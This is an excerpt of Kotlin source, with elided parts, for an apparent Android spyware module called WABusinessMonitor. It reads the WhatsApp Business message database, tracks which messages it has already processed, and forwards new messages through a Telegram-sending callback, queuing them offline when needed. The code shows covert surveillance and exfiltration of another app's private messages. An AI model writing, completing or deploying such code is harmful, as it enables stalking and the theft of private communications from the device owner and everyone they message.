 ...
 */
class WABusinessMonitor(
    private val context: Context,
    private val sendTelegram: (String, String?) -> Boolean
) {
    companion object {
        private const val TAG = "WABusinessMonitor"
        private const val WA_PACKAGE = "com.whatsapp.w4b"
    ...
    private val workDir: File by lazy {
        val dir = context.getExternalFilesDir("wabusiness/watchdir")
            ?: File(context.cacheDir, "wabusiness/watchdir")
    ...
    fun start(scope: CoroutineScope) {
        ...
        watcherJob = scope.launch(Dispatchers.IO) {
            try {
                ...
                if (prefsManager.whatsappBusinessLastProcessedId > currentMaxId) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Database wipe detected (Stored: ${prefsManager.whatsappBusinessLastProcessedId}, Current Max: $currentMaxId). Resetting baseline.")
                    prefsManager.whatsappBusinessLastProcessedId = currentMaxId
                }

                if (prefsManager.whatsappBusinessLastProcessedId == 0L) {
                    prefsManager.whatsappBusinessLastProcessedId = currentMaxId
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Baseline established (ID: ${prefsManager.whatsappBusinessLastProcessedId}). Watching for live messages...")
                } else {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resuming from ID: ${prefsManager.whatsappBusinessLastProcessedId}. Performing catch-up sync...")
    ...
    private suspend fun processNewMessages(isCatchUp: Boolean = false) {
        ...
        db.use { database ->
            ...
            for (row in rows) {
                if (row.id > prefsManager.whatsappBusinessLastProcessedId) {
                    val formatted = formatOutputMessage(row)
                    if (isCatchUp) {
                        com.system.superiormonitor.bot.OfflineManager.queueOnly(
                            context = context,
                            message = formatted,
                            offlineSubdir = "wabusiness",
                            offlineFileName = "offline_wabusiness.txt"
                        )
                    } else {
                    ...
                    prefsManager.whatsappBusinessLastProcessedId = row.id
                }
            }
    ...
    private suspend fun executeQuery(db: SQLiteDatabase, query: String): List<MessageRow> {
        ...
        val cursor = db.rawQuery(query, arrayOf(prefsManager.whatsappBusinessLastProcessedId.toString()))
    ...
    private fun formatOutputMessage(row: MessageRow): String {
        ...
        return com.system.superiormonitor.bot.BotMessages.Alerts.buildWABusinessMessage(
